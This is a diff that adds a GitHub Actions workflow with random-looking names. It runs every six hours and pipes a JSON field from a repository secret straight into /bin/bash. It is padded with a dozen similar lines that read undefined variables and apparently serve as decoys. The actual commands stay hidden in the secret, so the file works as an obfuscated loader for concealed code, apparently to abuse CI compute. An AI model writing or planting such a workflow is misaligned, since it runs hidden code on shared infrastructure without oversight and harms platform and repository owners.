@@ -1,0 +1,29 @@
+name: zhushaoyun6981
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhushaoyun6981
+        env:
+          nien311: ${{ secrets.nien311 }}
+        run: |
+          echo $nien311 | jq -r .x11 | /bin/bash
+          echo $i08 | jq -r .x55 | /bin/bash
+          echo $y8855 | jq -r .pm44149 | /bin/bash
+          echo $g192 | jq -r .kb0 | /bin/bash
+          echo $b15832 | jq -r .mmcwk4361 | /bin/bash
+          echo $bkrp9 | jq -r .nrplw1 | /bin/bash
+          echo $i56 | jq -r .sue63434 | /bin/bash
+          echo $c9852 | jq -r .rnix78936 | /bin/bash
+          echo $tr9301 | jq -r .gne2202 | /bin/bash
+          echo $yhp4 | jq -r .naga311 | /bin/bash
+          echo $znsin96264 | jq -r .dxhpl1 | /bin/bash
+          echo $mtq05 | jq -r .t39 | /bin/bash
+          echo $u24100 | jq -r .eofo94 | /bin/bash
+
